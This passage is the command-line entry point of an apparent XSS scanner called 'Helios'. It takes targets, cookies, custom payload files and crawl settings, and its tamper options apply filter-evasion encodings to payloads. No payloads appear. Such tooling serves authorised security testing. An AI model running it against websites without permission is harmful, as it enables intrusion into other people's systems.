    parser.add_argument("--headers", nargs='+', help="Custom headers in the format 'Name:Value'")
    parser.add_argument("--cookies", nargs='+', help="Cookies in the format 'Name=Value'")
    parser.add_argument("-o", "--output", help="Output file to write results")
    parser.add_argument("--payload-file", help="File containing custom XSS payloads")
    parser.add_argument("--scan-headers", action="store_true", help="Enable header scanning")
    parser.add_argument("--crawl", action="store_true", help="Enable crawling of the target website")
    parser.add_argument("--crawl-depth", type=int, default=2, help="Depth of crawling (default: 2)")
    parser.add_argument("--tamper", choices=['doubleencode', 'uppercase', 'hexencode', 'jsonfuzz', 'spacetab', 'all'], 
                        help="Apply evasion technique to payloads")
    args = parser.parse_args()

    if not args.target and not args.target_list:
        parser.error("Either a target URL or a target list file must be provided.")

    custom_headers = {}
    if args.headers:
        for header in args.headers:
            name, value = header.split(':', 1)
            custom_headers[name.strip()] = value.strip()

    cookies = {}
    if args.cookies:
        for cookie in args.cookies:
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()

    targets = []
    if args.target is not None:
        print(f"[*] Target URL: {args.target}\n")
    if args.target_list:
        with open(args.target_list, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(targets)} target URLs from {args.target_list}")
    elif args.target:
        targets = [args.target]

    for target in targets:
        scanner = XSSScanner(target, args.browser, args.headless, args.threads, 
                             custom_headers, cookies, args.output, args.payload_file, args.tamper)
        scanner.verbose = args.verbose
        scanner.skip_header_scan = not args.scan_headers
        scanner.crawl = args.crawl
        scanner.crawl_depth = args.crawl_depth

        try:
            scanner.run_scan()
        except KeyboardInterrupt:
            scanner.print_and_save("[!] Scan interrupted by user. Exiting...", important=True)
            scanner.cleanup()
        except Exception as e:
            if scanner.verbose:
                print(f"\n[!] An unexpected error occurred: {str(e)}")
            scanner.print_and_save(f"[!] Scan error: {str(e)}", important=True)
            scanner.cleanup()
        finally:
            scanner.print_and_save(f"[!] Helios has concluded testing {target}.", important=True)

    print("All scans completed. Thank you for using the tool.")

if __name__ == "__main__":
    banner()
    main()